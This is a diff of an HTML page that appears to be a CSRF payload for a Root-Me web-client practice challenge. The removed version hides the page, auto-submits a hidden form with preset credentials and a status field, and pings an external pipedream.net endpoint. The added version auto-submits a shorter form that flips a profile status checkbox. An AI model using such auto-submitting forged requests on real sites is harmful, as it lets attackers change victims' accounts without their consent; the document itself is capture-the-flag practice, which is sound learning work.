@@ -1,23 +1,5 @@
-<style>
-  /* Rends tout le body invisible */
-  body { display:none; }
-</style>
-
-<form id="f"
-      action="http://challenge01.root-me.org/web-client/ch22/?action=register"
-      method="POST">
-  <input type="hidden" name="username" value="tonioshast">
-  <input type="hidden" name="password" value="tonioshast">
-  <input type="hidden" name="status_profile" value="1">
-</form>
-
-<script>
-  
-  // Soumission automatique une fois la page complètement chargée
-  window.onload = () => {
-    new Image().src = "https://eo24g6niho492nt.m.pipedream.net/ping?ts=" + Date.now();
-    document.getElementById('f').submit();
-  };
-</script>
- 
+<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="POST"> 
+  <input type="checkbox" name="status" checked> 
+  <input type="text" name="username" value="tonioshast">
+<script> document.forms[0].submit(); </script>
 
